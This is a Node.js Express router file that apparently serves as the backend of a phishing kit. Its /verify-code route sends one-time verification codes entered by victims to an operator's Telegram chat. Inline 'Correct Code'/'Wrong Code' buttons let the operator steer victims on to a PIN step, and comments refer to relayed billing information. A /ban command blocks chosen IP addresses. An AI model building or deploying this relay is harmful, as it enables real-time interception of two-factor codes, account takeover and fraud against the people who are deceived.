const express = require("express");
const router = express.Router();
const fs = require("fs-extra");
const path = require("path");
const axios = require("axios");
const { sendToTelegram } = require("../services/telegramService");

// Store verification type and status (in production, use a database)
let selectedVerificationType = null;
let verificationStatus = null;

// Reset verification type
router.post("/reset-verification", (req, res) => {
  selectedVerificationType = null;
  verificationStatus = null;
  res.json({ success: true });
});

// Get current verification type
router.get("/verification-type", (req, res) => {
  res.json({ type: selectedVerificationType });
});

// Get verification status
router.get("/verification-status", (req, res) => {
  res.json({ status: verificationStatus });
});

// Reset verification status
router.post("/reset-status", (req, res) => {
  verificationStatus = null;
  res.sendStatus(200);
});

// Webhook for telegram updates
router.post("/webhook", async (req, res) => {
  // Send immediate response to prevent timeout
  res.sendStatus(200);

  try {
    const { message, callback_query } = req.body;

    // Handle callback queries (button clicks)
    if (callback_query) {
      const data = callback_query.data;

      // Handle verification type selection
      if (data.startsWith("type_")) {
        selectedVerificationType = data.replace("type_", "");

        // Edit the original message to remove buttons but keep the billing info
        await axios.post(
          `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageText`,
          {
            chat_id: callback_query.message.chat.id,
            message_id: callback_query.message.message_id,
            text:
              callback_query.message.text +
              `\n\nSelected verification type: ${selectedVerificationType}`,
            parse_mode: "HTML",
          }
        );
      }

      // Handle verification status
      else if (data === "verify_correct" || data === "verify_wrong") {
        verificationStatus =
          data === "verify_correct" ? "pending_pin" : "wrong";
        const statusMessage =
          data === "verify_correct"
            ? "✅ Verification code confirmed as correct"
            : "❌ Verification code marked as incorrect";

        // Edit the original message to remove buttons
        await axios.post(
          `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageText`,
          {
            chat_id: callback_query.message.chat.id,
            message_id: callback_query.message.message_id,
            text: callback_query.message.text + `\n\n${statusMessage}`,
            parse_mode: "HTML",
          }
        );
      }

      return;
    }

    // Handle /ban command
    if (message?.text?.startsWith("/ban")) {
      const ip = message.text.split(" ")[1];

      if (!ip) {
        await sendToTelegram(
          "Please provide an IP address to ban. Usage: /ban ip_address"
        );
        return;
      }

      const banListPath = path.join(__dirname, "../data/ban_list.txt");

      try {
        // Create directory if it doesn't exist
        await fs.ensureDir(path.dirname(banListPath));

        // Check if IP is already banned
        let bannedIPs = [];
        try {
          const existingContent = await fs.readFile(banListPath, "utf-8");
          bannedIPs = existingContent.split("\n").filter((ip) => ip.trim());
        } catch (err) {
          // File doesn't exist yet, that's ok
        }

        if (bannedIPs.includes(ip)) {
          await sendToTelegram(`⚠️ IP ${ip} is already banned`);
          return;
        }

        // Append new IP
        await fs.appendFile(banListPath, `${ip}\n`);
        await sendToTelegram(`✅ IP ${ip} has been banned successfully`);
      } catch (error) {
        console.error("Error managing ban list:", error);
        await sendToTelegram(
          `❌ Failed to ban IP ${ip}. Error: ${error.message}`
        );
      }
    }
  } catch (error) {
    console.error("Webhook error:", error);
  }
});

// Add this after the other routes but before module.exports
router.post("/verify-code", async (req, res) => {
  try {
    const { code, verificationType } = req.body;
    verificationStatus = null; // Reset status before new verification

    // Send verification request to telegram
    await axios.post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: `
🔐 <b>Verification Code Check</b>

📝 <b>Type:</b> ${verificationType}
🔑 <b>Code:</b> ${code}

<b>Is this code correct?</b>
        `,
        parse_mode: "HTML",
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [
              { text: "✅ Correct Code", callback_data: "verify_correct" },
              { text: "❌ Wrong Code", callback_data: "verify_wrong" },
            ],
          ],
        }),
      }
    );

    res.status(200).json({ message: "Verification in progress" });
  } catch (error) {
    console.error("Error sending verification code:", error);
    res.status(500).json({ error: "Failed to process verification" });
  }
});

module.exports = router;
